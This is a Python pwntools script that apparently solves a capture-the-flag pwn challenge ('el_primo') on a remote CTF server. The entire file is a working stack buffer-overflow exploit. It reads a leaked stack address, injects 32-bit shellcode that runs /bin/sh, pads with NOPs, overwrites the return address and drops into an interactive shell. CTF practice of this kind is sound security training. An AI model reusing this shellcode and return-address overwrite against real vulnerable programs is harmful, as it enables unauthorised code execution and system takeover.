from pwn import *

p = remote('p1.tjctf.org', 8011)
#p = process('./el_primo_60')

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"	# 31

print p.recvuntil('hint: ')
stack = int(p.recvline().replace('\n',''),16)
print 'return to %#x' % stack
print 'shellcode size = ',len(shellcode)
payload = ''
payload += shellcode
payload += '\x90'*(32-len(payload))
payload += p32(stack+64)
payload += 'a'*24
payload += p32(stack)

p.sendline(payload)

p.interactive()
